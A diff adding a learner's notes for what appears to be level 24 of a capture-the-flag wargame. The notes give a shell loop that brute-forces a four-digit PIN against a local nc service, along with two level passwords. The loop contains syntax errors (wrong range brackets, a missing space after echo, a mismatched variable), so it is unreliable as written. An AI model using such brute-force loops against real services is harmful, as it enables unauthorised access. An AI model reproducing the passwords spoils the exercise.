@@ -1,0 +1,11 @@
+LEVEL 24:
+COMMANDS USED ARE:
+using brute force 
+for I in (0000..9999);do
+   echo"gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
+done | nc localhost 30002 :
+for loop is used for iteration of pin to match the password
+
+
+ password 
+iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
